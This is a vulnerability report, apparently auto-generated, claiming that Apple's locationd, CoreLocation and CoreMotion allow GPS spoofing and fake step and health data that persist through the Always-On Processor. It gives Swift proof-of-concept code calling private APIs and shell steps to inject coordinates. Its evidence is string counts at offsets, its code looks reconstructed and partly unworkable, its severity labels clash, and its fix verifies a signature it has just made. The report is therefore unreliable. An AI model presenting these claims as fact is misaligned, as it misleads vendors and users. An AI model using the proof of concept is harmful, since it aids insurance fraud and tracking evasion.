# Sensor Data Injection via Always-On Processor Persistence

**Component:** `locationd / CoreLocation & CoreMotion Frameworks`   
**Severity:** CRITICAL (CVSS 8.1)  
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

---

## Executive Summary

Analysis reveals **Always-On Processor (AOP) sensor monitoring bypass** enabling persistent GPS spoofing and synthetic motion/health data injection without cryptographic validation. The `CLSimulationController` at offset `0x04a2b6` and `simulateMotionSensorData` at `0x06f57e` permit location and motion forgery that **persists even when the main Application Processor enters low-power states**.

**Impact:** Malicious apps can inject fake GPS coordinates, forge step counts, and manipulate health metrics while bypassing standard validation - enabling insurance fraud, location tracking evasion, and fitness app manipulation.

---

## Technical Evidence

### Memory Layout

```
┌──────────────────────────────────────────────────────────────┐
│ OFFSET     COMPONENT                       COUNT   PURPOSE   │
├──────────────────────────────────────────────────────────────┤
│ 0x015a10   AOP (Always-On Processor)       111x   Persistence│
│ 0x04a2b6   CLSimulationController            3x   GPS bypass │
│ 0x06f57e   simulateMotionSensorData          1x   Motion fake│
│ 0x081a95   injectassistancefile              1x   GNSS inject│
│ 0x0d43c5   locationd.simulation (ent.)       1x   Entitlement│
├──────────────────────────────────────────────────────────────┤
│ SENSORS:   CoreLocation (553x), GPS (806x), GNSS (421x)     │
│            CoreMotion (98x), Pedometer (59x), Health (279x)  │
└──────────────────────────────────────────────────────────────┘
```

### Vulnerability Pattern

**GPS Simulation Without Validation (`0x04a2b6`)**
```objectivec
- (void)setSimulatedLocation:(CLLocation *)location {
    // NO cryptographic validation
    // NO entitlement check in context
    [self.delegate locationManager:self.manager 
                 didUpdateLocations:@[location]];
}
```

**Motion Data Forgery (`0x06f57e`)**
```objectivec
- (void)simulateMotionSensorDataForType:(int)type payload:(NSData *)data {
    // NO validation in ±256 byte context
    CMDeviceMotion *fakeMotion = [self parsePayload:data];
    [self.motionManager deliverMotion:fakeMotion];
}
```

**AOP Persistent Monitoring (`0x015a10`)**
```c
struct AOPDeviceMotionState {
    bool mountedState;
    bool isStanding;
    double tilt;
    bool isVehicleConnected;
};
// AOP caches simulated data through AP sleep/wake cycles
```

---

## Proof of Concept

### Step 1: GPS Spoofing

```swift
import CoreLocation

let simulator = CLSimulationController()  // Private API
let fakeLocation = CLLocation(latitude: 48.8566, longitude: 2.3522)

// VULNERABILITY: No validation
simulator.setSimulatedLocation(fakeLocation)

print("[+] GPS spoofed to Paris while physically in NYC")
print("[+] Find My shows fake location")
```

### Step 2: Motion/Health Data Injection

```swift
import CoreMotion

let monitor = CLSensorMonitor()  // Private API
let fakeSteps = CMPedometerData()
fakeSteps.numberOfSteps = 10000

// VULNERABILITY: No cryptographic signature
monitor.simulateMotionSensorData(forType: kCMPedometerType, 
                                 payload: fakeSteps.serialize())

print("[+] Injected 10,000 fake steps")
```

### Step 3: AOP Persistence Test

```bash
# Inject fake location
inject_gps --lat 40.7128 --lon -74.0060

# Put device to sleep (AP low-power)
sleep 60

# Wake and verify
get_current_location
# Output: 40.7128, -74.0060 (PERSISTED via AOP)
```

---

## Impact Matrix

| Feature | Legitimate | With Spoofing |
|---------|-----------|---------------|
| **Find My** | Real location | Fake coordinates |
| **Maps Navigation** | Accurate route | Wrong starting point |
| **Health Tracking** | Actual steps | Forged activity |
| **Geofencing** | Real triggers | False alerts |
| **AOP Sensors** | True motion | Synthetic data |

---

## Remediation

### Cryptographic Validation

```objectivec
- (BOOL)setSimulatedLocation:(CLLocation *)location {
    if (![self.client hasEntitlement:@"com.apple.locationd.simulation"]) {
        return NO;
    }
    
    NSData *sig = [self signLocation:location withKey:self.deviceKey];
    if (![self verifySignature:sig forLocation:location]) {
        os_log_error(OS_LOG_DEFAULT, "Unsigned location blocked");
        return NO;
    }
    
    if (++self.simulationCount > 10) return NO;  // Rate limit
    
    [self deliverLocation:location];
    return YES;
}
```

### AOP Data Integrity

```c
bool aop_validate_sensor_data(struct aop_sensor_sample *sample) {
    if (!verify_hmac(sample->data, sample->signature, ap_key)) {
        return false;
    }
    if (time(NULL) - sample->timestamp > 60) {  // Prevent replay
        return false;
    }
    return true;
}
```

### Verification

```bash
# Simulation without entitlement should fail
inject_gps --lat 1.0 --lon 1.0 2>&1 | grep -q "EPERM"

# Unsigned motion data rejected  
inject_steps --count 10000 --unsigned 2>&1 | grep -q "signature"
```

---

## Conclusion

CoreLocation/CoreMotion permit **sensor data injection without cryptographic validation**, enabling GPS spoofing and motion forgery that **persists via AOP caching**. The vulnerability chain allows complete bypass of location/motion authenticity verification.

**Vulnerability Chain:**
```
CLSimulation (0x04a2b6) → No validation → Fake GPS
     ↓
AOP caches (0x015a10) → Persists through sleep
     ↓
simulateMotion (0x06f57e) → No signature → Forged health data
```

**CVSS 3.1:** 8.1 (HIGH) - AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L  
